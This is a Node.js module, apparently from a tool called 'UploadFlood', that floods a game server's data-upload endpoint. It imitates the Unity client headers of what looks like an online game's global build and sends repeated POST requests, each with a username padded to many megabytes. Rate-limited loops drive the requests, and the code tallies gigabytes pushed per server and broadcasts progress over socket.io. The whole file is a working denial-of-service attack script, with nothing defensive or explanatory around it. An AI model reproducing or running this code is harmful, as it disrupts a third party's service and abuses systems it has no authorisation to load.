const axios =  require('axios')
const rateLimit = require('axios-rate-limit')
const lineReader = require('line-reader')
const fs = require('fs')
const { Console } = require('console')


const http = rateLimit(axios.create(), { maxRequests: 4, perMilliseconds: 1000, maxRPS: 4 })
var count = 0

let myIo

var stat = []

async function makeAcc(userName, serverAddr, multiplier) {
  const options = {
    method: 'POST',
    url: `https://${serverAddr}/sdk/dataUpload`,
    headers: {
      Host: serverAddr,
      'User-Agent': 'UnityPlayer/2017.4.30f1 (UnityWebRequest/1.0, libcurl/7.51.0-DEV)',
      Accept: '*/*',
      'Accept-Encoding': 'identity',
      'Content-Type': 'application/octet-stream',
      'x-rpc-client_type': '3',
      'x-rpc-sys_version': 'a',
      'x-rpc-device_id': 'a',
      'x-rpc-device_model': 'a',
      'x-rpc-device_name': 'a',
      'x-rpc-mdk_version': '1.30.0.0',
      'x-rpc-channel_version': '1.30.0.0',
      'x-rpc-channel_id': '1',
      'x-rpc-sub_channel_id': '0',
      'x-rpc-language': 'en',
      'x-rpc-game_biz': 'hk4e_global',
      'x-rpc-risky': 'id=none;c=;s=;v=',
      'X-Unity-Version': '2017.4.30f1'
    },
    data: {
      account: userName,
      password: 'a',
      is_crypto: true
    },
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
  };

  await http.request(options).then(res => {
    if (res.data.code === 0) {
        count += 1
        let now = new Date()

        let toSend = `[UploadFlood] Success | ${now.getHours()}:${now.getMinutes()}`
        myIo.emit('chat message', toSend)
        console.log(toSend)
        
        //update stat
        for (let i = 0; i < stat.length; i++) {
            const element = stat[i];
            if (element.serverName == serverAddr) {
                element.bigSent = element.bigSent + 1
                element.uploadSize = element.uploadSize + (1 * multiplier / 1024)
            }
        }

        // console.log(stat)

        let size = (count * multiplier / 1024).toFixed(3)

        // console.log(`${count} packet sent | Size: ${size}GB`)

        printServerStat()
        return true
        // console.log(res.data)
    } else {
        console.log('err')
        myIo.emit('chat message', 'err line 74')
        return false
    }
  }).catch(err => {
        console.log(err.message)
        myIo.emit('hat message', err.message)
        return false
  })
}

var oneMb = fs.readFileSync('././file/1mb.txt','utf8');


async function sendUpload(serverAddr, randString, multiplier, amount, io) {
    myIo = io
    
    //stat stuff
    let isExist = isStatExist(serverAddr)
    if (!isExist) {
        addServerToStat(serverAddr)
    }


    var tenMb = oneMb.repeat(multiplier);

    console.log('Sending Big Packet')
    for (let i=0; i<amount; i++) {
        // 10 Mb each
        let userName = randString +i.toString() + randString + tenMb + (Math.floor(Date.now() / 1)).toString()
        var isSuccess = await makeAcc(userName, serverAddr, multiplier)
    }
}


// single
async function singleUpload(serverAddr, multiplier, io) {
    myIo = io

    //stat stuff
    let isExist = isStatExist(serverAddr)
    if (!isExist) {
        addServerToStat(serverAddr)
    }

    var tenMb = oneMb.repeat(multiplier);
    let userName = tenMb + (Math.floor(Date.now() / 1)).toString()
    await makeAcc(userName, serverAddr, multiplier)
}


// check if server entry exist in stat
function isStatExist(serverAddr) {
    let selectedServer = stat.filter((srv) => {
        return srv.serverName == serverAddr
    })

    if (selectedServer.length > 0) {
        console.log(`${serverAddr} exist`)
        return true
    } else {
        console.log(`${serverAddr} is not exist`)
        return false
    }
}


// add new server to stat
function addServerToStat(serverAddr) {
    let isExist = isStatExist(serverAddr)
    if (isExist) {
        return false
    }

    let newServer = {
        serverName: serverAddr,
        uploadSize: 0,
    }

    console.log(`${serverAddr} added`)

    stat.push(newServer)
    return true
}


// get server stat
function printServerStat() {
    stat.forEach((srv) => {
        let now = new Date()
        let formatedString = `[UploadFlood] Srv: ${srv.serverName} | Upload: ${srv.uploadSize.toFixed(3)}GB | At: | ${now.getHours()}:${now.getMinutes()}`
        console.log(formatedString)
        myIo.emit('chat message', formatedString)
    })
}


module.exports = {
    sendUpload,
    singleUpload,
}
